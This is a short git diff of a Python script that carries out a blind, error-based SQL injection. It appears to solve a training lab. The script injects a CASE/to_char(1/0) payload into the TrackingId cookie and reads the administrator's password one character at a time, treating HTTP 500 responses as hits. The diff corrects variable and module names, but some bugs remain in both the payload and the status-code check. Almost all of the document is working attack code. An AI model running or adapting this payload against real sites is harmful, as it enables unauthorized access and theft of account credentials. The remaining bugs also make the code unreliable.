@@ -65,13 +65,13 @@ def MakeSQLI():
     p2 = log.progress("Password")
 
     for position in range(1, 21):
-	    for character in characteres:
+	    for character in characters:
 		    cookies = {
-			    "TrackingID": "valor ' ||(select case when substr(password,%d,1)='%s' then to_char(1/0) then else '' end from users where username='administrator')||" % (position, character),
+			    "TrackingId": "valor ' ||(select case when substr(password,%d,1)='%s' then to_char(1/0) then else '' end from users where username='administrator')||" % (position, character),
 			    "session": "valor"           # El valor se obtiene de Burpsuite
 		    }
-		    p1.status(cookies['TrackingID'])
-		    r = request.get(main_url, cookies=cookies)
+		    p1.status(cookies['TrackingId'])
+		    r = requests.get(main_url, cookies=cookies)
 		    if r.status.code == 500:   # Si el codigo de estado es 500 
 			    password += character
 			    p2.status(password)
